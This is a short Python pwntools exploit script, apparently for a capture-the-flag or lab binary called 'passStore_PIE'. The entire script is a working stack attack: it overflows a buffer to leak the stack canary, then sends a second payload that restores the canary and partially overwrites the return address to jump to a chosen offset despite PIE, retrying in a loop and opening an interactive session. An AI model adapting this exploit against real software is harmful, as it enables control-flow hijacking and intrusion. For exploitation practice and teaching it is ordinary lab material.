from pwn import *



#gdb.attach(r , api=True)

while True:
    binary = ELF('./passStore_PIE')
    r = process(binary.path)
    payload1 = b"a"*56
    print(r.recv())
    r.sendline(payload1)
    print(r.recvline())
    canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
    canary += b"\x00"*(8 - len(canary))
    print(canary)
    log.info("Leaked canary: " + str(hex(u64(canary))))
    log.info("---------------------------------------")

    offset_main_pie = 0x1258 
    payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p16(offset_main_pie)
    r.sendlineafter(b"Retype: ",payload2)

    print(r.recvall())

    #r.sendline(b"1")
    
    

    r.interactive()